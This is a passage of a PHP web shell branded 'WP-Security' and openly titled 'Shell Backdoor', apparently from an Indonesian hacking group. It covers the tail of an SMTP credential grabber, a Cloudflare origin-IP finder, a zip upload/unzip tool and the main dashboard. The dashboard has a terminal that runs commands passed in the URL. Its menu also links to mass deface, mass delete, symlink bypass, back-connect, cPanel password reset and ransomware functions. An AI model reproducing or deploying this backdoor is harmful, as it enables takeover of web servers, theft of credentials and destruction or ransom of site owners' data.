                    <td>SMTP User: $smtp_user</td>
                </tr>
                <tr>
                    <td>SMTP Pass: $smtp_pass</td>
                </tr>
                <tr>
                    <td>SMTP Auth: $smtp_auth</td>
                </tr>
                <tr>
                    <td>SMTP Secure: $smtp_secure</td>
                </tr>
            </table>";
        }
    }
    echo "<p class='text-muted'>NB : Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/namafolder_config )</p>";
    exit;
}
function bypasscf() {
    echo '<form method="POST">
        <h5 class="text-center mb-3">Bypass Cloud Flare</h5>
        <div class="form-group input-group">
            <select class="form-control" name="idsPilih">
                <option>Pilih Metode</option>
                <option>ftp</option>
                <option>direct-conntect</option>
                <option>webmail</option>
                <option>cpanel</option>
            </select>
        </div>
        <div class="form-group input-group mb-4">
            <input class="form-control" type="text" name="target" placeholder="Masukan Url">
            <input class="btn btn-danger form-control" type="submit" value="Bypass">
        </div>
    </form>';
    $target = $_POST['target'];
    if ($_POST['idsPilih'] == 'ftp') {
        $ftp = gethostbyname('ftp.'."$target");
        echo "<p align='center' dir='ltr'><font face='Tahoma' size='3' color='#00ff00'>Correct 
        ip is : </font><font face='Tahoma' size='3' color='#F68B1F'>$ftp</font></p>";
    }
    if ($_POST['idsPilih'] == 'direct-conntect') {
        $direct = gethostbyname('direct-connect.'."$target");
        echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='3' color='#00ff00'>Correct 
        ip is : </font><font face='Tahoma' size='3' color='#F68B1F'>$direct</font></p>";
    }
    if ($_POST['idsPilih'] == 'webmail') {
        $web = gethostbyname('webmail.'."$target");
        echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='3' color='#00ff00'>Correct 
        ip is : </font><font face='Tahoma' size='3' color='#F68B1F'>$web</font></p>";
    }
    if ($_POST['idsPilih'] == 'cpanel') {
        $cpanel = gethostbyname('cpanel.'."$target");
        echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='3' color='#00ff00'>Correct 
        ip is : </font><font face='Tahoma' size='3' color='#F68B1F'>$cpanel</font></p>";
    }
    exit;
}
function zipMenu($dir, $file) {
    //Compress/Zip
    $exzip = basename($dir).'.zip';
    function Zip($source, $destination) {
        if (extension_loaded('zip') === true) {
            if (file_exists($source) === true) {
                $zip = new ZipArchive();
                if ($zip->open($destination, ZIPARCHIVE::CREATE) === true) {
                    $source = realpath($source);
                    if (is_dir($source) === true) {
                        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
                        foreach ($files as $file) {
                            $file = realpath($file);
                            if (is_dir($file) === true) {
                                // $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                            } elseif (is_file($file) === true) {
                                $zip->addFromString(str_replace($source.'/', '', $file), file_get_contents($file));
                            }
                        }
                    } elseif (is_file($source) === true) {
                        $zip->addFromString(basename($source), file_get_contents($source));
                    }
                }

                return @$zip->close();
            }
        }

        return false;
    }
    //Extract/Unzip
    function Zip_Extrack($zip_files, $to_dir) {
        $zip = new ZipArchive();
        $res = $zip->open($zip_files);
        if ($res === true) {
            $name = basename($zip_files, '.zip').'_unzip';
            @mkdir($name);
            @$zip->extractTo($to_dir.'/'.$name);

            return @$zip->close();
        } else {
            return false;
        }
    }
    echo '<div class="card card-body text-dark mb-4">
        <h4 class="text-center">Zip Menu</h3>
        <form enctype="multipart/form-data" method="post">
            <div class="form-group">
                <label>Zip File:</label>
                <div class="custom-file">
                    <input type="file" name="zip_file" class="custom-file-input" id="customFile">
                    <label class="custom-file-label" for="customFile">Choose file</label>
                </div>
                <input type="submit" name="upnun" class="btn btn-danger btn-block mt-3" value="Upload & Unzip"/>
            </div>
        </form>';
    if ($_POST['upnun']) {
        $filename = $_FILES['zip_file']['name'];
        $tmp = $_FILES['zip_file']['tmp_name'];
        if (move_uploaded_file($tmp, "$dir/$filename")) {
            echo Zip_Extrack($filename, $dir);
            unlink($filename);
            $swa = 'success';
            $text = 'Berhasil Mengekstrak Zip';
            swall($swa, $text, $dir);
        } else {
            echo '<b>Gagal!</b>';
        }
    }
    echo "<div class='row'><div class='col-md-6 mb-3'><h5>Zip Backup</h5>
        <form method='post'>
            <label>Folder</label>
            <input type='text' name='folder' class='form-control mb-3' value='$dir'>
            <input type='submit' name='backup' class='btn btn-danger btn-block' value='Backup!'>
        </form>";
    if ($_POST['backup']) {
        $fol = $_POST['folder'];
        if (Zip($fol, $_POST['folder'].'/'.$exzip)) {
            $swa = 'success';
            $text = 'Berhasil Membuat Zip';
            swall($swa, $text, $dir);
        } else {
            echo '<b>Gagal!</b>';
        }
    }
    echo "</div>
        <div class='col-md-6'><h5>Unzip Manual</h5>
        <form action='' method='post'>
            <label>Zip Location:</label>
            <input type='text' name='file_zip' class='form-control mb-3' value='$dir/$exzip'>
            <input type='submit' name='extrak' class='btn btn-danger btn-block' value='Unzip!'>
        </form>";
    if ($_POST['extrak']) {
        $zip = $_POST['file_zip'];
        if (Zip_Extrack($zip, $dir)) {
            $swa = 'success';
            $text = 'Berhasil Mengekstrak Zip';
            swall($swa, $text, $dir);
        } else {
            echo '<b>Gagal!</b>';
        }
    }
    echo '</div></div></div>';
}
?>
<html>
    <head>
        <meta name="viewport" content="widht=device-widht, initial-scale=1"/>
        <meta name="theme-color" content="#343a40"/>
        <meta name="copyright" content="WP-Security"/>
        <link rel="icon" type="image/png" href="https://"/>
        <title>WP-Security | Dashboard</title>
        
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.2/css/all.min.css"/>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
        <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@8.18.0/dist/sweetalert2.all.min.js"></script>
    </head>
    <body class="bg-dark text-light">
        <script>
            $(document).ready(function(){
                $(window).scroll(function(){
                    if ($(this).scrollTop() > 700){
                        $(".scrollToTop").fadeIn();
                    }else{
                        $(".scrollToTop").fadeOut();
                    }
                });
                $(".scrollToTop").click(function(){
                    $("html, body").animate({scrollTop : 0},1000);
                    return false;
                });
            });
            $(document).ready(function(){
                $('input[type="file"]').on("change", function(){
                    let filenames = [];
                    let files = document.getElementById("customFile").files;
                    if (files.length > 1){
                        filenames.push("Total Files (" + files.length + ")");
                    }else{
                        for (let i in files){
                            if (files.hasOwnProperty(i)){
                                filenames.push(files[i].name);
                            }
                        }
                    }
                    $(this).next(".custom-file-label").html(filenames.join(","));
                });
            });
            var max_fields = 5;
            var x = 1;
            $(document).on('click', '#add_input', function(e){
                if(x < max_fields){
                    x++;
                    $('#output').append('<div class=\"input-group\ form-group\ text-dark\" id=\"out\"><input type=\"text\" class=\"form-control\" name=\"nama_file[]\" placeholder=\"Nama File...\"><div class=\"input-group-prepend\ remove\"><div class=\"input-group-text\"><a href="#" class="text-dark"><i class=\"fa fa-minus\"></i></a></div></div></div>');
                }
                $('#output').on("click",".remove", function(e){
                    e.preventDefault(); $(this).parent('#out').remove(); x--;
                    repeat();
                })
            });
            $(document).on('click', '#add_input1', function(e){
                if(x < max_fields){
                    x++;
                    $('#output1').append('<div class=\"input-group\ form-group\ text-dark\" id=\"out\"><input type=\"text\" class=\"form-control\" name=\"nama_folder[]\" placeholder=\"Nama Folder...\"><div class=\"input-group-prepend\ remove\"><div class=\"input-group-text\"><a href="#" class="text-dark"><i class=\"fa fa-minus\"></i></a></div></div></div>');
                }
                $('#output1').on("click",".remove", function(e){
                    e.preventDefault(); $(this).parent('#out').remove(); x--;
                    repeat();
                })
            });
            
        </script>
        <style>
            @import url(https://fonts.googleapis.com/css?family=Lato);
            @import url(https://fonts.googleapis.com/css?family=Quicksand);
            @import url(https://fonts.googleapis.com/css?family=Inconsolata);
            @media(min-width:767px){.scrollToTop{display:none !important;}}
            @media(max-width:767px){textarea{font-size:13px !important;}}
            input[type="text"],textarea {font-family: "Inconsolata", monospace;}
            body{margin:0;padding:0;font-family:"Lato";overscroll-behavior:none;}
            .infor{font-size:14px;color:#333!important;}
            .ds{color:#f00!important;word-wrap:break-word;}
            #tab table thead th{padding:5px;font-size:16px;white-space: nowrap;}
            #tab tr {border-bottom:1px solid #ccc;}
            #tab tr:hover{background:#5B6F7D;color:#fff;}
            #tab tr td{padding:5px 10px;white-space:nowrap;}
            .pinggir{text-align:left !important; padding-left: 4px !important;}
            #tab tr td .badge{font-size:13px;}
            .active,.active:hover{color:#00FF00;}
            a {font-family:"Quicksand"; color:white;}
            a:hover{color:dodgerBlue;}
            .badge{width:30px;transition:.3s;}
            .badge:hover{transform: scale(1.1);transition:.3s;}
            .ico {width:25px;}
            .ico2{width:30px;}
            .scrollToTop{
                position:fixed;
                bottom:30px;
                right:30px;
                width:35px;
                height:35px;
                background:#262626;
                color:#fff;
                border-radius:15%;
                text-align:center;
                opacity:.5;
            }
            .scrollToTop:hover{color:#fff;}
            .up{font-size:25px;line-height:35px;}
            .lain{color:#888888;font-size:20px;margin-left:5px;top:1px;}
            .lain:hover{color:#fff;}
            .tambah{
                width:35px;
                height:35px;
                line-height:35px;
                border:1px solid;
                border-radius:50%;
                text-align:center;
            }
            .fiture{margin:3px;}
            .tmp th {font-size:14px;}
            .tmp tr td{border:solid 1px #BBBBBB;text-align:center;font-size:13px;padding:2px 5px;}
            .tmp tr:hover{background:#5B6F7D; color:#fff;}
            .about{color:#000;}
            .about .card-body .img{
                position: relative;
                background: url(https://i.postimg.cc/Wb1X4xNS/image.png);
                background-size: cover;
                width: 150px;
                height: 150px;
            }
            .butn {
                position: relative;
                text-align: center;
                padding: 3px;
                background:rgba(225,225,225,.3);
                -webkit-transition: background 300ms ease, color 300ms ease;
                transition: background 300ms ease, color 300ms ease;
            }
            input[type="radio"].toggle {display:none;}
            input[type="radio"].toggle + label {cursor:pointer;margin:0 2px;width:60px;}
            input[type="radio"].toggle + label:after {
                position: absolute;
                content: "";
                top: 0;
                background: #fff;
                height: 100%;
                width: 100%;
                z-index: -1;
                -webkit-transition: left 400ms cubic-bezier(0.77, 0, 0.175, 1);
                transition: left 400ms cubic-bezier(0.77, 0, 0.175, 1);
            }
            input[type="radio"].toggle.toggle-left + label:after {left:100%;}
            input[type="radio"].toggle.toggle-right + label {margin-left:-5px;}
            input[type="radio"].toggle.toggle-right + label:after {left:-100%;}
            input[type="radio"].toggle:checked + label {cursor:default;color:#000;-webkit-transition:color 400ms;transition: color 400ms;}
            input[type="radio"].toggle:checked + label:after {left:0;}
        </style>
        <nav class="navbar static-top navbar-dark">
            <button class="navbar-toggler"type="button" data-toggle="collapse" data-target="#info" aria-label="Toggle navigation">
                <i style="color:#fff;" class="fa fa-navicon"></i>
            </button>
            <div class="collapse navbar-collapse" id="info">
                <ul>
                    <a href="https://facebook.com/IndoSecOfficial" class="lain"><i class="fa fa-facebook tambah"></i></a>
                    <a href="https://www.instagram.com/indosec.id" class="lain"><i class="fa fa-instagram tambah"></i></a>
                    <a href="https://www.youtube.com/IndoSec" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
                    <a href="https://github.com/indosecid" class="lain"><i class="fa fa-github tambah"></i></a>
                    <a href="https://indosec.web.id" class="lain"><i class="fa fa-globe tambah"></i></a>
                </ul>
            </div>
        </nav>
        <div class="container">
            <h1 class="text-center"><a href="https://fauzaro01.web.app" style="color:#ffffff;">WP-Security</h1>
            <center><h5>Shell Backdoor</a></h5></center>
            <hr/>
            <div class="text-center">
                <div class="d-flex justify-content-center flex-wrap">
                    <a href="?" class="fiture btn btn-danger btn-sm"><i class="fa fa-home"></i> Home</a>
                    <a href="?dir=<?= $dir ?>&aksi=upload" class="fiture btn btn-danger btn-sm"><i class="fa fa-upload"></i> Upload</a>
                    <a href="?dir=<?= $dir ?>&aksi=buat_file" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus-circle"></i> Buat File</a>
                    <a href="?dir=<?= $dir ?>&aksi=buat_folder" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus"></i> Buat Folder</a>
                    <a href="?dir=<?= $dir ?>&aksi=masdef" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-triangle"></i> Mass Deface</a>
                    <a href="?dir=<?= $dir ?>&aksi=masdel" class="fiture btn btn-danger btn-sm"><i class="fa fa-trash"></i> Mass Delete</a>
                    <a href="?dir=<?= $dir ?>&aksi=jumping" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-triangle"></i> Jumping</a>
                    <a href="?dir=<?= $dir ?>&aksi=config" class="fiture btn btn-danger btn-sm"><i class="fa fa-cogs"></i> Config</a>
                    <a href="?dir=<?= $dir ?>&aksi=adminer" class="fiture btn btn-danger btn-sm"><i class="fa fa-user"></i> Adminer</a>
                    <a href="?dir=<?= $dir ?>&aksi=symlink" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-circle"></i> Symlink</a>
                    <a href="?dir=<?= $dir ?>&aksi=bctools" class="fiture btn btn-danger btn-sm"><i class="fas fa-network-wired"></i> Network</a>
                    <a href="?dir=<?= $dir ?>&aksi=resetpasscp" class="fiture btn btn-warning btn-sm"><i class="fa fa-key"></i> Auto Reset Cpanel</a>
                    <a href="?dir=<?= $dir ?>&aksi=auteduser" class="fiture btn btn-warning btn-sm"><i class="fas fa-user-edit"></i> Auto Edit User</a>
                    <a href="?dir=<?= $dir ?>&aksi=ransom" class="fiture btn btn-warning btn-sm"><i class="fab fa-keycdn"></i> Ransomware</a>
                    <a href="?dir=<?= $dir ?>&aksi=smtpgrab" class="fiture btn btn-warning btn-sm"><i class="fas fa fa-exclamation-circle"></i> SMTP Grabber</a>
                    <a href="?dir=<?= $dir ?>&aksi=bypascf" class="fiture btn btn-warning btn-sm"><i class="fas fa-cloud"></i> Bypass Cloud Flare</a>
                    <a href="?dir=<?= $dir ?>&aksi=zip_menu" class="fiture btn btn-warning btn-sm"><i class="fa fa-file-archive-o"></i> Zip Menu</a>
                    <a href="?about" class="fiture btn btn-warning btn-sm"><i class="fa fa-info"></i> About Us</a>
                    <a href="?keluar" class="fiture btn btn-warning btn-sm"><i class="fa fa-sign-out"></i> keluar</a>
                </div>
            </div>
            <div class="row">
                <div class="col-md-5"><br/>
                    <h5><i class="fa fa-terminal"></i>Terminal : </h5>
                    <form>
                        <input type="text" class="form-control" name="cmd" autocomplete="off" placeholder="id | uname -a | whoami | heked">
                    </form>
                    <hr/>
                    <h5><i class="fa fa-search"></i> Informasi : </h5>
                    <div class="card table-responsive">
                        <div class="card-body">
                            <table class="table infor">
                                <tr>
                                    <td>PHP</td>
                                    <td> : <?= $ver ?></td>
                                </tr>
                                <tr>
                                    <td>IP Server</td>
                                    <td> : <?= $ip ?></td>
                                </tr>
                                <tr>
                                    <td>HDD</td>
                                    <td class="d-flex">Total : <?=formatSize($total) ?> Free : <?=formatSize($free) ?> [<?= $pers ?>%]</td>
                                </tr>
                                <tr>
                                    <td>Domain</td>
                                    <td>: <?= $dom ?></td>
                                </tr>
                                <tr>
                                    <td>MySQL</td>
                                    <td>: <?= $mysql ?></td>
                                </tr>
                                <tr>
                                    <td>cURL</td>
                                    <td>: <?= $curl ?></td>
                                </tr>
                                <tr>
                                    <td>Mailer</td>
                                    <td>: <?= $mail ?></td>
                                </tr>
                                <tr>
                                    <td>Disable Function</td>
                                    <td>: <?= $show_ds ?></td>
                                </tr>
                                <tr>
                                    <td>Software</td>
                                    <td>: <?= $sof ?></td>
                                </tr>
                                <tr>
                                    <td>Sistem Operasi</td>
                                    <td> : <?= $os ?></td>
                                </tr>
                            </table>
                        </div>
                    </div><hr/>
                </div>
            <div class="col-md-7 mt-4">
                <?php
                //keluar
                if (isset($_GET['keluar'])) {
                    session_start();
                    session_destroy();
                    echo '<script>window.location="?";</script>';
                }
                //cmd
                if (isset($_GET['cmd'])) {
                    echo "<pre class='text-white'>".exe($_GET['cmd']).'</pre>';
                    exit;
                }
                //about
                if (isset($_GET['about'])) {
                    about();
                }
                //upload
                if ($_GET['aksi'] == 'upload') {
                    aksiUpload($dir);
                }
                //openfile
                if (isset($_GET['file'])) {
                    $file = $_GET['file'];
                }
                $nfile = basename($file);
                //chmod
                if ($_GET['aksi'] == 'chmod_file') {
                    chmodFile($dir, $file, $nfile);
                }
                //buat_file
                if ($_GET['aksi'] == 'buat_file') {
                    buatFile($dir, $imgfile);
                }
                //view
                if ($_GET['aksi'] == 'view') {
                    view($dir, $file, $nfile, $imgfile);
                }
                //edit
                if ($_GET['aksi'] == 'edit') {
                    editFile($dir, $file, $nfile, $imgfile);
                }
                //rename
                if ($_GET['aksi'] == 'rename') {
                    renameFile($dir, $file, $nfile, $imgfile);
                }
                //Delete File
                if ($_GET['aksi'] == 'hapusf') {
                    hapusFile($dir, $file, $nfile);
                }
                $ndir = $_GET['target'];
                //chmod
                if ($_GET['aksi'] == 'chmod_dir') {
                    chmodFolder($dir, $ndir);
                }
                //Add Folder
                if ($_GET['aksi'] == 'buat_folder') {
                    buatFolder($dir, $imgfol);
                }
                //Rename Folder
                if ($_GET['aksi'] == 'rename_folder') {
                    renameFolder($dir, $ndir, $imgfol);
                }
                //Delete Folder
                if ($_GET['aksi'] == 'hapus_folder') {
                    deleteFolder($dir, $ndir);
                }

                /*
                    * Fungsi_Tambahan
                    *
                    *
                    * Mass Deface
                    * IndoXploit
                */
                if ($_GET['aksi'] == 'masdef') {
                    aksiMasdef($dir, $file, $imgfol, $imgfile);
                }
                /*
                    * mass delete
                    * IndoXploit
                */
                if ($_GET['aksi'] == 'masdel') {
                    aksiMasdel($dir, $file, $imgfol, $imgfile);
                }
                /*
                    * Jumping
                    * IndoXploit
                */
                if ($_GET['aksi'] == 'jumping') {
                    aksiJump($dir, $file, $ip);
                }
                //Config
                if ($_GET['aksi'] == 'config') {
                    aksiConfig($dir, $file);
                }
                //Bypass etc/passwd
                if ($_GET['aksi'] == 'passwbypass') {
                    aksiBypasswd($dir, $file);
                }
                //Adminer
                if ($_GET['aksi'] == 'adminer') {
                    aksiAdminer($dir, $file);
                }
                /*
                    * Symlink
                    * Kuda Shell
                */
                if ($_GET['aksi'] == 'symlink') {
                    aksiSym($dir, $file);
                }
                if ($_GET['aksi'] == 'symread') {
                    aksiSymread($dir, $file);
                }
                if ($_GET['aksi'] == 'sym_404') {
                    sym404($dir, $file);
                }
                if ($_GET['aksi'] == 'sym_bypas') {
                    symBypass($dir, $file);
                }
                /*
                    * Back Connect
                    * Kuda Shell
                */
                if ($_GET['aksi'] == 'bctools') {
                    bcTool($dir, $file);
                }
                /*
                    * Bypass Disable Function
                    * Kuda Shell
                */
                if ($_GET['aksi'] == 'disabfunc') {
                    disabFunc($dir, $file);
                }
                /*
                    * Auto Reset Cpanel
                    * IndoSec -Fauzan-
                */
                if ($_GET['aksi'] == 'resetpasscp') {
                    resetCp($dir);
                }
                /*
                    * Auto Edit User
                    * IndoXploit
                */
                if ($_GET['aksi'] == 'auteduser') {
                    autoEdit($dir, $file);
                }
                /*
                    * Ransomware
                    * IndoSec
                */
                if ($_GET['aksi'] == 'ransom') {
                    ransom($dir, $file);
                }
                /*
                    * SMTP Grabber
                    * IndoXploit
                */
                if ($_GET['aksi'] == 'smtpgrab') {
                    scj($dir);
                }
                //Bypass Cloud Flare
                if ($_GET['aksi'] == 'bypascf') {
                    bypasscf();
                }
                /*
                    * Zip Menu
                    * IndoSec -Rizsyard-
                */
                if ($_GET['aksi'] == 'zip_menu') {
                    zipMenu($dir, $file);
                }
                
                $dirs = explode('/', $dir);
                echo 'Path : ';
                foreach ($dirs as $id=>$pat) {
                    if ($pat == '' && $id == 0) {
                        $a = true;
                        echo '<a href="?dir=/">/</a>';
                        continue;
                    }
                    if ($pat == '') {
                        continue;
                    }
                    echo '<a style="word-wrap:break-word;" href="?dir=';
                    for ($i = 0; $i <= $id; $i++) {
                        echo "$dirs[$i]";
                        if ($i != $id) {
                            echo '/';
                        }
                    }
                    echo '">'.$pat.'</a>/';
                }
                $scandir = scandir($dir);
                echo '&nbsp;&nbsp;[ '.w($dir, perms($dir)).' ]';
                ?>
                <div id="tab"><table class="text-white mt-1 table-hover table-responsive">
                    <thead class="bg-info text-center">
                        <th class="text-left">File/folder</th>
                        <th>Size</th>
                        <th>Last Modified</th>
                        <th>Permission</th>
                        <th>Action</th>
                    </thead>
                    <?php
                    if (count($scandir) == 2) {
                        echo "<tr><td class='text-center' colspan='5'>Direktori kosong</td></tr>";
                    }
                    foreach ($scandir as $dirb) {
                        $dtime = date('d/m/y G:i', filemtime("$dirb/$dirx"));
                        /* cek jika ini berbentuk folder */
                        /* cek jika nama folder karaker terlalu panjang */
                        if (strlen($dirb) > 18) {
                            $_dir = substr($dirb, 0, 18).'...';
                        } else {
                            $_dir = $dirb;
                        }
                        if (!is_dir($dir.'/'.$dirb) || $dirb == '.' || $dirb == '..') {
                            continue;
                        } ?>
                        <tr class="text-center">
                            <td class="pinggir"><?= $imgfol ?> <a href="?dir=<?= $dir ?>/<?= $dirb ?>"><?= $_dir ?></a></td>
                            <td>--</td>
                            <td><?= $dtime ?></td>
                            <td>
                                <a href="?dir=<?= $dir ?>&target=<?= $dirb ?>&aksi=chmod_dir">
                                <?php
                                if (is_writable($dir.'/'.$dirb)) {
                                    $color = '#00ff00';
                                } elseif (!is_readable($dir.'/'.$dirb)) {
                                    $color = 'red';
                                }
                                echo "<font color='$color'>".perms($dir.'/'.$dirb).'</font>'; ?>
                                </a>
                            </td>
                            <td>
                                <a title="Rename" class="badge badge-success" href="?dir=<?= $dir ?>&target=<?= $dirb ?>&aksi=rename_folder">&nbsp;<i class="fas fa-pen"></i>&nbsp;</a>&nbsp;&nbsp;<a title="Delete" class="badge badge-danger" href="?dir=<?= $dir ?>&target=<?= $dirb ?>&aksi=hapus_folder">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>
                            </td>
                        </tr>
                    <?php
                    }

                    foreach ($scandir as $file) {
                        $ftime = date('d/m/y G:i', filemtime("$dir/$file"));
                        /* cek jika ini berbentuk file */
                        if (!is_file($dir.'/'.$file)) {
                            continue;
                        }
                        /* cek jika karaker terlalu panjang */
                        if (strlen($file) > 25) {
                            $_file = substr($file, 0, 25).'...-.'.$ext;
                        } else {
                            $_file = $file;
                        }
                        /* set image berdasarkan extensi file */
                        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION)); ?>
                        <tr class="text-center">
                            <td class="pinggir">
                                <img src="<?= iconFile($ext) ?>"class="ico2"></img>
                                <a href="?dir=<?= $dir ?>&aksi=view&file=<?= $dir ?>/<?= $file ?>"><?= $_file ?></a>
                            </td>
                            <td><?= formatSize(filesize($file)) ?></td>
                            <td><?= $ftime ?></td>
                            <td>
                                <a href="?dir=<?= $dir ?>&aksi=chmod_file&file=<?= $dir ?>/<?= $file ?>" class="text-center">
                                <?php
                                if (is_writable($dir.'/'.$file)) {
                                    $color = '#00ff00';
                                } elseif (!is_readable($dir.'/'.$file)) {
                                    $color = 'red';
                                }
                                echo "<font color='$color'>".perms($dir.'/'.$file).'</font>'; ?>
                                </a>
                            </td>
                            <td class="d-flex">
                                <a title="Lihat" class="badge badge-info" href="?dir=<?= $dir ?>&aksi=view&file=<?= $dir ?>/<?= $file ?>">&nbsp;<i class="fa fa-eye"></i>&nbsp;</a>&nbsp;&nbsp;
                                <a title="Edit" class="badge badge-success" href="?dir=<?= $dir ?>&aksi=edit&file=<?= $dir ?>/<?= $file ?>">&nbsp;<i class="far fa-edit"></i>&nbsp;</a>&nbsp;&nbsp;
                                <a title="Rename" class="badge badge-success" href="?dir=<?= $dir ?>&aksi=rename&file=<?= $dir ?>/<?= $file ?>">&nbsp;<i class="fa fa-pencil"></i>&nbsp;</a>&nbsp;&nbsp;
                                <a title="Delete" class="badge badge-danger" href="?dir=<?= $dir ?>&aksi=hapusf&file=<?= $dir ?>/<?= $file ?>" title="Delete">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>&nbsp;&nbsp;
                                <a title="Download" class="badge badge-primary" href="?&dir=<?= $dir ?>&aksi=download&file=<?= $dir ?>/<?= $file ?>" title="Download">&nbsp;<i class="fa fa-download"></i>&nbsp;</a>
                            </td>
                        </tr>
                    <?php
                    }
                    ?>
                </table></div><hr/>
                <center><a class="text-muted" href="https://fauzaro01.web.app">Copyright <?= Date("Y"); ?> WP-Security</a></center><br/>
                <a href='#' class='scrollToTop'><i class='fa fa-arrow-up up' aria-hidden='true'></i></a>
            </div>
        </div>
    </body>
</html>
